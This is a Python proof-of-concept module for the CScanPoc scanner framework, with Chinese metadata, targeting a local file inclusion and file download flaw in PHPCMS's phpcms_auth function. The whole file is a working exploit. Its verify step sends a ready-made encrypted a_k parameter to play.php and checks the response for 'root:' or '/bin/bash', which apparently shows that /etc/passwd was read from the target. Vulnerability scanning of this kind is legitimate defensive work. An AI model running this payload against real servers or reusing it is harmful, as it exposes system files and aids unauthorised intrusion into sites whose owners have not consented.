# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0112'  # 平台漏洞编号
    name = 'PHPCMS的phpcms_auth导致的本地文件包含漏洞和任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2011-05-02'  # 漏洞公布时间
    desc = '''
    phpcms_auth函数是phpcms里面为了增强程序的安全性的一个加密函数，
    用它来对用户提交的加密字符串进行解密，进入程序流程，如果我们可以控制了phpcms_auth函数的解密，
    我们就可以通过注射我们的恶意代码，进行攻击。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=497
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '757b8c64-df1a-491c-ba60-e7df5fbfa47b'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/n/phpcms/play.php?a_k=GnRBQwJbXkEEUSAjIAJKCTUhSktdZl5LQEhBSExCaXhtRkJKdWtZShY9E0ofBxwUFQhjZnNPD1AoNUQLB3oCWF8eWlcRCSV4LBsL"
            url = self.target + payload
            response = requests.get(url)
            if 'root:' in response.text or "/bin/bash" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
